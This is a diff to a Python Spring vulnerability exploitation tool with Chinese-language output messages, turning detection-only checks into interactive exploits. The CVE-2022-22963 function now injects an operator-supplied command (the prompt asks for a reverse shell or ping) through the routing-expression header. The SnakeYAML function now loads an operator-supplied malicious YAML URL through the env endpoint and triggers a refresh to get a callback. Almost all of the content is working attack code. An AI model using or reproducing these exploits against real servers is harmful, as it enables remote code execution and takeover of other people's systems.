@@ -92,9 +92,9 @@ def CVE_2022_22965(url, proxies, header_new):
 
 def CVE_2022_22963(url, proxies, header_new):
     cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
-    header = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'}
+    header = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("mkdir /tmp/log")'}
     data = 'test'
-    oldHeader = {
+    oldHeader_1 = {
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
         'Accept-Language': 'en',
@@ -102,19 +102,38 @@ def CVE_2022_22963(url, proxies, header_new):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     path = 'functionRouter'
-    headernew = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
+    headernew = json.loads(str(JSON_handle(oldHeader_1, header_new)).replace("'", "\""))
     header.update(headernew)
+    url = url + path
     try:
-        url = url + path
         requests.packages.urllib3.disable_warnings()
         req = requests.post(url=url, headers=header, timeout = outtime, data=data, verify=False, proxies=proxies)
         code = req.status_code
         text = req.text
         rsp = '"error":"Internal Server Error"'
+        vul_status = 0
         if (code == 500) and (rsp in text):
-            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell\n', "red")
+            vul_status = 1
+            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞\n', "red")
         else:
             cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
+
+        if (vul_status == 1):
+            Cmd = input("[+] 请输入反弹shell或ping的命令（无回显）>>> ")
+            header = {
+                'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("'+ Cmd + '")'}
+            header.update(headernew)
+            req = requests.post(url=url, headers=header, timeout=outtime, data=data, verify=False, proxies=proxies)
+            code = req.status_code
+            text = req.text
+            rsp = '"error":"Internal Server Error"'
+            vul_status = 0
+            if (code == 500) and (rsp in text):
+                vul_status = 1
+                cprint(f'[+] {url} 命令执行成功，请检查是否收到回连\n', "red")
+            else:
+                cprint("[-] 命令执行失败\n", "yellow")
+
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
@@ -336,6 +355,7 @@ def CVE_2021_21234(url,proxies, header_new):
 
 def SnakeYAML_RCE(url, proxies, header_new):
     cprint("======开始对目标URL进行SnakeYAML RCE漏洞测试======","green")
+
     oldHeaders_1 = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
@@ -344,26 +364,49 @@ def SnakeYAML_RCE(url, proxies, header_new):
         "User-Agent": random.choice(ua),
         "Content-Type": "application/json"
         }
+
     payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
     payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
-    path = 'env'
+    url_1 = url + 'env'
+    url_2 = url + 'actuator/env'
+    url_refresh_1 = url + 'refresh'
+    url_refresh_2 = url + 'actuator/refresh'
     Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
     Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
+
     try:
         requests.packages.urllib3.disable_warnings()
-        urltest = url + path
-        re1 = requests.post(url=urltest, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=url_1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=url_2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+
         if ('example.yml' in str(re1.text)):
-            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
+            cprint("[+] 发现SnakeYAML-RCE漏洞，版本为Spring 1.x", "red")
+            EvilUrl = input("[+] 请输入恶意yaml所在的URL（如：http://chybeta.com/example.yml）>>> ")
+            EvilUrl = EvilUrl.strip()
+            payload_1 = "spring.cloud.bootstrap.location=" + EvilUrl
+            re1 = requests.post(url=url_1, headers=Headers_1, timeout=outtime, data=payload_1, allow_redirects=False,
+                                verify=False, proxies=proxies)
+            requests.post(url=url_refresh_1, headers=Headers_1, timeout=outtime, allow_redirects=False,)
+            if ('example.yml' in str(re1.text)):
+                cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
+            else:
+                cprint("[-] 恶意yaml加载失败，请检查URL是否正确\n", "yellow")
+
         elif ('example.yml' in str(re2.text)):
-            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
+            cprint("[+] 发现SnakeYAML-RCE漏洞，版本为Spring 2.x", "red")
+            EvilUrl = input("[+] 请输入恶意yaml所在的URL（如：http://chybeta.com/example.yml）>>> ")
+            EvilUrl = EvilUrl.strip()
+            payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"" + EvilUrl + "\"}"
+            re2 = requests.post(url=url_2, headers=Headers_2, timeout=outtime, data=payload_2, allow_redirects=False,
+                                verify=False, proxies=proxies)
+            requests.post(url=url_refresh_2, headers=Headers_2, timeout=outtime, allow_redirects=False,)
+            if ('example.yml' in str(re2.text)):
+                cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
+            else:
+                cprint("[-] 恶意yaml加载失败，请检查URL是否正确\n", "yellow")
         else:
             cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
+
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
@@ -629,6 +672,7 @@ def CVE_2024_37084(url, proxies, header_new):
 
     try:
         try:
+            requests.packages.urllib3.disable_warnings()
             response = requests.get(url + "api/package/", headers=Headers_1, timeout=outtime, verify=False, proxies=proxies)
             response.raise_for_status()
             data = response.json()
